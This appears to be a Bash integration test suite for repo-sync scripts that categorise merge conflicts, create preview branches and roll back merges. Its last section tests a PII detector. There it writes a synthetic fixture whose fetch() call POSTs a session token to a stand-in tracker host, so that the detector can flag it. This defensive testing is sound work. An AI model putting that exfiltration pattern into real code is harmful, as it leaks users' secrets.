#!/usr/bin/env bash
# run-conflict-tests.sh
# Integration tests for Phase 2 scripts:
#   - categorize_conflicts.sh (decision tree + determinism)
#   - preview_merge.sh (preview branch isolation)
#   - sync_rollback.sh (last-merge revert)
# Bash 3.2 compatible. Self-contained — uses ephemeral repo in $TMPDIR.

set -uo pipefail

SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
REPO_ROOT="$( cd "$SCRIPT_DIR/../../.." && pwd )"
CATEGORIZE="$REPO_ROOT/.agent/workflows/categorize_conflicts.sh"
PREVIEW="$REPO_ROOT/.agent/workflows/preview_merge.sh"
ROLLBACK="$REPO_ROOT/.agent/workflows/sync_rollback.sh"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'

PASS=0
FAIL=0

ok()  { echo -e "${GREEN}✅ $*${NC}"; PASS=$((PASS+1)); }
no()  { echo -e "${RED}❌ $*${NC}"; FAIL=$((FAIL+1)); }
note(){ echo -e "${YELLOW}   $*${NC}"; }

# ─── Test scaffolding ────────────────────────────────────────────────────
TMP=$(mktemp -d -t arkon-conflict.XXXXXX)
trap 'rm -rf "$TMP"' EXIT

LOCAL_DIR="$TMP/local"
UPSTREAM_DIR="$TMP/upstream"

# Build the synthetic repo. We need:
#   - shared ancestor file
#   - one file diverged only upstream (safe-upstream)
#   - one file diverged only locally with >5 LOC (keep-local)
#   - one file diverged both sides with >5 LOC (needs-merge)
#   - one file local-only trivial change (safe-upstream by category fall-through)
build_repo() {
  rm -rf "$LOCAL_DIR" "$UPSTREAM_DIR"

  git init -q -b main "$UPSTREAM_DIR"
  (
    cd "$UPSTREAM_DIR"
    git config user.email t@t; git config user.name t
    cat > shared-a.ts <<'EOF'
export const a = 1;
export const b = 2;
EOF
    cat > shared-b.py <<'EOF'
def x(): return 1
def y(): return 2
EOF
    cat > shared-c.ts <<'EOF'
export const c = 1;
EOF
    cat > shared-trivial.py <<'EOF'
def z(): return 1
EOF
    git add . && git commit -q -m "ancestor"
  )

  git clone -q "$UPSTREAM_DIR" "$LOCAL_DIR"
  (
    cd "$LOCAL_DIR"
    git config user.email t@t; git config user.name t
    git remote rename origin upstream
  )

  # Upstream-only changes.
  (
    cd "$UPSTREAM_DIR"
    cat >> shared-a.ts <<'EOF'
export const d = 4;
EOF
    cat >> shared-b.py <<'EOF'
def upstream_added():
    a = 1
    b = 2
    c = 3
    d = 4
    e = 5
    return a+b+c+d+e
EOF
    cat >> shared-c.ts <<'EOF'
export const c2 = 2;
export const c3 = 3;
export const c4 = 4;
export const c5 = 5;
export const c6 = 6;
export const c7 = 7;
EOF
    git commit -qam "upstream advance"
  )

  # Local divergence on shared-b (>5 LOC) and shared-c (>5 LOC), plus trivial.
  (
    cd "$LOCAL_DIR"
    cat >> shared-b.py <<'EOF'
def local_added():
    p = 1
    q = 2
    r = 3
    s = 4
    t = 5
    return p+q+r+s+t
EOF
    cat >> shared-c.ts <<'EOF'
export const local_c1 = 1;
export const local_c2 = 2;
export const local_c3 = 3;
export const local_c4 = 4;
export const local_c5 = 5;
export const local_c6 = 6;
EOF
    # Trivial: whitespace + comment only.
    cat >> shared-trivial.py <<'EOF'

# only a comment
EOF
    git commit -qam "local feature"
    # Pull updated upstream ref so the scripts can see it.
    git fetch -q upstream main
  )
}

# ─── 1. categorize basic decision tree ───────────────────────────────────
build_repo
cd "$LOCAL_DIR"
JSON=$(bash "$CATEGORIZE" upstream/main 2>/dev/null)
echo "$JSON" | jq -e 'type == "array"' >/dev/null \
  && ok "categorize emits a JSON array" \
  || { no "categorize JSON output malformed"; note "$JSON"; }

cat_of() {
  echo "$JSON" | jq -r --arg f "$1" '.[] | select(.file==$f) | .category'
}

[ "$(cat_of shared-a.ts)" = "safe-upstream" ] \
  && ok "shared-a.ts (upstream-only, no local commits) → safe-upstream" \
  || no "shared-a.ts expected safe-upstream, got $(cat_of shared-a.ts)"

[ "$(cat_of shared-b.py)" = "needs-merge" ] \
  && ok "shared-b.py (both sides >5 LOC) → needs-merge" \
  || no "shared-b.py expected needs-merge, got $(cat_of shared-b.py)"

CAT_C="$(cat_of shared-c.ts)"
[ "$CAT_C" = "needs-merge" ] || [ "$CAT_C" = "keep-local" ] \
  && ok "shared-c.ts (both sides >5 LOC) → $CAT_C" \
  || no "shared-c.ts unexpected: $CAT_C"

# ─── 2. determinism: run 10 times, sha256 must match ─────────────────────
HASHES=""
i=0
while [ "$i" -lt 10 ]; do
  H=$(bash "$CATEGORIZE" upstream/main 2>/dev/null | shasum -a 256 | awk '{print $1}')
  HASHES="${HASHES}${H}\n"
  i=$((i+1))
done
UNIQ=$(printf "$HASHES" | sort -u | grep -c . || true)
[ "$UNIQ" = "1" ] \
  && ok "categorize deterministic (10 runs → 1 hash)" \
  || no "categorize NOT deterministic ($UNIQ distinct hashes)"

# ─── 3. security overlay forces security-risk ────────────────────────────
echo "shared-a.ts" > "$TMP/overlay.txt"
OVERLAY_OUT=$(bash "$CATEGORIZE" upstream/main "$TMP/overlay.txt" 2>/dev/null)
ROW=$(echo "$OVERLAY_OUT" | jq -r '.[] | select(.file=="shared-a.ts") | .category')
[ "$ROW" = "security-risk" ] \
  && ok "security overlay overrides to security-risk" \
  || no "overlay failed, got $ROW"

# ─── 4. summary mode counts categories ───────────────────────────────────
SUMMARY=$(bash "$CATEGORIZE" upstream/main --summary 2>/dev/null)
echo "$SUMMARY" | grep -q "^total: " \
  && ok "summary mode emits total line" \
  || { no "summary missing total"; note "$SUMMARY"; }

# ─── 5. preview_merge creates isolated branch ────────────────────────────
build_repo
cd "$LOCAL_DIR"
bash "$CATEGORIZE" upstream/main > "$TMP/conflicts.json" 2>/dev/null
ORIG_BRANCH=$(git symbolic-ref --short HEAD)
ORIG_HEAD=$(git rev-parse HEAD)

PREVIEW_OUT=$(bash "$PREVIEW" "$TMP/conflicts.json" upstream/main 2>&1) || preview_rc=$?
preview_rc=${preview_rc:-0}

NEW_HEAD=$(git rev-parse HEAD)
PREVIEW_BRANCH=$(git branch --list 'merge-preview-*' | head -1 | tr -d ' *')

if [ "$preview_rc" -eq 0 ] && [ "$ORIG_HEAD" = "$NEW_HEAD" ]; then
  ok "preview_merge does not advance original branch"
else
  no "preview_merge left original branch advanced (rc=$preview_rc)"
fi

if [ -n "$PREVIEW_BRANCH" ]; then
  ok "preview_merge created branch: $PREVIEW_BRANCH"
else
  no "preview branch not created"
  note "$PREVIEW_OUT" | tail -10
fi

# ─── 6. preview branch reject path leaves main clean ────────────────────
if [ -n "$PREVIEW_BRANCH" ]; then
  git branch -D "$PREVIEW_BRANCH" >/dev/null 2>&1
  REMAINING=$(git branch --list 'merge-preview-*' | grep -c . || true)
  [ "$REMAINING" -eq 0 ] \
    && ok "preview branch deletion clean" \
    || no "preview branch still present after delete"
fi

# ─── 7. sync_rollback last-merge revert (isolated fresh repo) ───────────
ROLLBACK_DIR="$TMP/rollback-test"
(
  set -e
  git init -q -b main "$ROLLBACK_DIR"
  cd "$ROLLBACK_DIR"
  git config user.email t@t
  git config user.name t
  echo "v1" > file.txt
  git add file.txt && git commit -q -m "init"
  git checkout -q -b feat-branch
  echo "v2" >> file.txt
  git commit -qam "feat work"
  git switch -q main
  git merge --no-ff -m "merge feat-branch" feat-branch >/dev/null
)

cd "$ROLLBACK_DIR"
MERGES_BEFORE=$(git log --merges -1 --format=%H)
[ -n "$MERGES_BEFORE" ] || { no "rollback fixture setup: no merge commit created"; }

ROLLBACK_OUT=$(bash "$ROLLBACK" last 2>&1) || rollback_rc=$?
rollback_rc=${rollback_rc:-0}
POST_ROLLBACK_HEAD=$(git rev-parse HEAD)

if [ "$rollback_rc" -eq 0 ] && [ "$MERGES_BEFORE" != "$POST_ROLLBACK_HEAD" ]; then
  ok "sync_rollback last revert created a new commit"
else
  no "sync_rollback last failed (rc=$rollback_rc)"
  note "$ROLLBACK_OUT" | tail -5
fi

# Reverting again should now find the revert as the "last merge"? No — revert
# is not a merge commit. So a second `last` should fail with "no merge".
ROLLBACK2_OUT=$(bash "$ROLLBACK" last 2>&1) || rollback2_rc=$?
rollback2_rc=${rollback2_rc:-0}
if [ "$rollback2_rc" -eq 1 ]; then
  ok "sync_rollback refuses second 'last' when no further merge to revert"
else
  no "sync_rollback should have refused (rc=$rollback2_rc)"
fi

# ─── 8. PII check whitelists AI provider call ────────────────────────────
PII_TMP="$TMP/pii"
mkdir -p "$PII_TMP/lib"
cat > "$PII_TMP/lib/audit-helpers.sh" "$REPO_ROOT/.agent/workflows/lib/audit-helpers.sh" 2>/dev/null
cp "$REPO_ROOT/.agent/workflows/lib/audit-helpers.sh" "$PII_TMP/lib/"
cp "$REPO_ROOT/.agent/workflows/lib/pii-patterns.sh" "$PII_TMP/lib/"

# Synthetic source: AI provider call carrying email — must NOT trigger PII WARN.
cat > "$PII_TMP/ai-call.ts" <<'EOF'
async function ask(email: string) {
  const res = await fetch("https://api.openai.com/v1/chat/completions", {
    method: "POST",
    body: JSON.stringify({ email, prompt: "hi" }),
  });
  return res.json();
}
EOF

# Synthetic source: exfil call — MUST trigger PII WARN.
cat > "$PII_TMP/exfil.ts" <<'EOF'
async function reportToken(token: string) {
  await fetch("https://collect.evil-tracker.example/event", {
    method: "POST",
    body: JSON.stringify({ token, session: "x" }),
  });
}
EOF

# Inline check: bash the patterns directly using the helpers.
(
  cd "$PII_TMP"
  # shellcheck disable=SC1091
  source lib/audit-helpers.sh
  # shellcheck disable=SC1091
  source lib/pii-patterns.sh

  ai_host=$(extract_url_host 'await fetch("https://api.openai.com/v1/chat/completions"')
  if is_ai_provider_host "$ai_host"; then
    echo "AI_HOST_OK"
  fi
  evil_host=$(extract_url_host 'await fetch("https://collect.evil-tracker.example/event"')
  if is_ai_provider_host "$evil_host" || is_internal_host "$evil_host"; then
    echo "EVIL_HOST_OK_BAD"
  else
    echo "EVIL_HOST_FLAGGED"
  fi
) > "$PII_TMP/result.txt" 2>&1

grep -q "AI_HOST_OK" "$PII_TMP/result.txt" \
  && ok "PII helper whitelists api.openai.com" \
  || no "PII helper failed to recognize api.openai.com"

grep -q "EVIL_HOST_FLAGGED" "$PII_TMP/result.txt" \
  && ok "PII helper flags evil-tracker host" \
  || no "PII helper failed to flag external host"

# ─── Summary ─────────────────────────────────────────────────────────────
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo " Phase 2 tests: $PASS passed, $FAIL failed"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

[ "$FAIL" -eq 0 ]
